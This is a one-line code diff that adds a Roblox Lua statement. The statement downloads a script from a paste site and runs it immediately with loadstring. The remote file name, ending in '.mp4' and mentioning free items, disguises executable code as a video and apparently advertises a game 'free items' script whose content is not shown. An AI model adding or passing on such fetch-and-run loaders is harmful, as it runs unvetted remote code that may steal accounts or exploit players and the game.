@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://pastecode.dev/raw/hxuoy7un/6FREEITEMS_lulaslollipop.mp4",true))()
